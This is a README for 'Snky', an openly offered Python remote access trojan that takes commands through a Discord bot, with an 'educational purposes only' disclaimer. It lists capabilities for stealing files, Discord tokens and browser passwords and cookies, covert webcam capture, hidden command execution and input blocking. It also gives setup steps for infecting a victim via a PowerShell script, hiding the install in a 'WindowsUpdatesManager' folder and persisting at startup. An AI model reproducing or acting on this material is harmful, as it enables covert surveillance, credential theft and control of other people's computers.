# Snky - A basic Python RAT.
****Project is for educational purposes only.****

Snky is a basic Python RAT controlled purely using a discord bot. It runs on startup without a console window. 

Written in Python, Batch and Powershell.
Written by: [@richa-z](https://github.com/richa-z) & [@mart1n-v](https://github.com/mart1n-v)
## Features
This project is in constant development.

Current commands:
- **.pcinfo** - Fetch information about the computer using the ```systeminfo``` command in command prompt.
- **.hardware** - Fetch information about the computer's hardware using WMIC. [GPU/CPU Name, HWID, RAM Capacity, Disk Capacity]
- **.shutdown** - Shutdown the computer.
- **.dir** - List the specified directory's files. Usage: ```.dir <full path>```
- **.tasklist** - List all tasks currently running on the host computer. Usage: ```.tasklist```
- **.taskkill** - Kill a specified task. Usage: ```.taskkill <PID>```
- **.screenshot** - Take a screenshot.
- **.open** - - Open a file on the host computer. Usage: ```.open <full file path>```. Example: ```.open c:/Users/user/Desktop/textfile.txt```
- **.copy** - Copy a specified file. Usage: ```.copy <full file path>```. Example: ```.copy c:/Users/user/Desktop/textfile.txt```
- **.bsod** - Trigger a BSOD.
- **.changepassword** - Change the user's password. Usage: ```.changepassword <new password>```
- **.webcam** - Take a picture using the webcamera.
- **.logout** - Logout the user from the computer.
- **.delete** - Delete a specified file. Usage: ```.delete <file path>```. Example: ```.delete c:/Users/user/Desktop/textfile.txt```
- **.upload** - Upload a file to the computer. Usage: ```.upload <file path>```. You need to upload the file as message attachment. Example: ```.upload c:/Users/user/Desktop/textfile.txt```
- **.hid** - Siumlates keyboard. Usage: ```.hid write <text>``` - writes text, ```.hid press <key>``` - simulates keypress, ```.hid hotkey <key1> <key2>``` - simulates keypresses of key1 and key2 at the same time.
            Examples: ```.hid write hello there``` - writes "hello there", ```.hid press enter``` - simulates keypress of enter key, ```.hid hotkey win r``` - simulates hotkey win + r.
- **.blockinput** - Block all input from the user's keyboard and mouse.
- **.unblockinput** - Unblock all input from the user's keyboard and mouse.
- **.selfdestruct** - Run a .bat file that removes the bot and all it's features from the computer.
- **.deletedir** - Delete a directory. Usage: ```.deletedir <full dir path>```. Example: ```.deletedir c:/Users/user/Desktop/MyFolder```
- **.createdir** - Create a directory. Usage: ```.createdir <new dir path>```. Example ```.createdir c:/Users/user/Desktop/MyNewFolder```
- **.modules** - List/run modules in the ```/modules``` folder. Usage: ```.modules <list/load> <if load, specify either file_name.py or "all">```
- **.clipboard** - Get/set the current clipboard item. Usage: ```.clipboard <get/set> <if you used ".clipboard set" parse the text to put into clipboard here>``` Note: ```.clipboard get``` returns the CURRENT copied text, not the whole history.
- **.networking** - Export ``ipconfig /all`` and send to discord.
- **.monitor** - Turn the host machine's monitor on/off. Usage: ``.monitor <on/off>``
- **.cmd** - Emulates a cmd command. No output visible. Usage: ``.cmd <cmd>``
- **.pws** - Executes a powershell command. No output visible. ``.pws <cmd>``
- **.file_collector** - Run a file stealer wich collects ``.txt, .docx, .pdf, .csv`` files. If enabled in it's config, also collects ``.png, .jpg, .jpeg, .webp`` files, however the size may exceed max discord limit.
- **.token_grab** - Run a discord token grabber.
- **.browser_grab** - Run a browser stealer. Collects cookies, password, data, history and download history.

## Instalation - User
- Create a new discord bot application at https://discord.com/developers/applications.
- Copy the token.
- Add the bot to a server where you'll use him.

- In attacker_tools, download ``token_encoding.py`` and paste the token into the "TOKEN_HERE" variable
- Copy the token (DO NOT COPY THE ``b'`` AT THE START AND THE ``'`` AT THE END.)
- Paste into the powershell code in the ``$pp`` variable.


## Instalation - Host
The infection process is done through the use of some powershell code. You want them to run the .ps1 file and let it finish.

The powershell code will install Python 3.10.11, latest version of Snky and create a shortcut in the startup folder. Then it restarts the computer.

The speed IS affected by network speed.

## Custom Modules
This project has custom module support! You can create your own module and then upload it into the host's computer using ``.upload C:/users/user/AppData/Local/WindowsUpdatesManager/Snky-main/modules``

You can also create configs for your modules (load and use them IN YOUR MODULE). Upload them using ``.upload C:/users/user/AppData/Local/WindowsUpdatesManager/Snky-main/cfg``

## Known Bugs
- None known

## AVs that detect Snky (THAT I TESTED)

- MS Defender ❌️ - Last detection: 19.1.
